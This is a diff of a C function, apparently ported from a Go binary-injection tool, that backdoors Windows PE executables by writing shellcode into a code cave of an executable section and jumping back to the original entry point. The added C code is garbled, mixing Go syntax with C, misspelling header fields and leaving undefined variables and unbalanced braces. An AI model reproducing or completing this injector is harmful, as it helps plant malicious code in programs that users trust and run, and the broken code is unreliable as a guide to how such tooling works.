@@ -1,43 +1,36 @@
 int binject_PE(char *file,char *shellcode,int method)
 {
+	PIMAGE_DOS_HEADER dos = (struct PIMAGE_DOS_HEADER *)address;
 	
   if(method==CODE_CAVE)
   {
 	  
-	/*
-		// Code Cave Method
-		shellcodeLen := len(shellcodeBytes) + 5 // 5 bytes get added later by AppendSuffixJmp
-		for _, section := range peFile.Sections {
-			flags := section.Characteristics
-			if flags&pe.IMAGE_SCN_MEM_EXECUTE != 0 { // todo: should we do the TLS section or other non-X sections?
-				// this section is executable
-				data, err := section.Data()
-				if err != nil {
-					return nil, err
-				}
-				caves, err := FindCaves(data)
-				if err != nil {
-					return nil, err
-				}
-				for _, cave := range caves {
-					if cave.End <= uint64(section.Size) && cave.End-cave.Start >= uint64(shellcodeLen) {
-						scAddr := section.Offset + uint32(cave.Start)
-						shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian)
-						peFile.InsertionAddr = scAddr
-						peFile.InsertionBytes = shellcode
-						return peFile.Bytes()
-					}
-				}
-			}
-		}
-	*/
-   for(i=0;i<sections;i++)
-  {
-       x=find_code_cave(strlen(shellcode,section_start,section_end,file_buffer);
-                        if(x!=0)
-                        break;
-  }
-  } 
+	address+=dos->e_elfanew
+	PIMAGE_NT_HEADERS nt = (struct PIMAGE_NT_HEADERS *)address;
+	address+= sizeof(IMAGE_NT_HEADERS);
+		for(int i=0;i<nt->FileHeader.NumberOfSections;i++) {
+			PIMAGE_SECTION_HEADER section= (struct PIMAGE_SECTION_HEADER*)address;
+			if(section->characteristics&pe.IMAGE_SCN_MEM_EXECUTE != 0 { 
+				uint32_t section_start=section->PointerToRawData;
+				uint32_t section_end=section_start+section->SizeOfRawData;
+				
+			        sclen+=5;
+				int x=find_code_cave(sclen,section_start,section_end,file_buffer);
+				if(x!=0)
+				{ 
+					char *shellcodefixed =ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian);
+					memcpy(file_buffer+x,shellcodefixed,sclen);
+					fwrite(file_buffer,1,size,f);
+					free(shellcodefixed);
+					free(file_buffer);
+					fclose(f);
+					return 0;
+				}		
+					address+=section.SizeOfRawData;	
+				                                                   }
+				                                 }
+   }
+			   
   if(method==NEW_SECTION)
   {
   int align(size, align, addr uint32) uint32 {
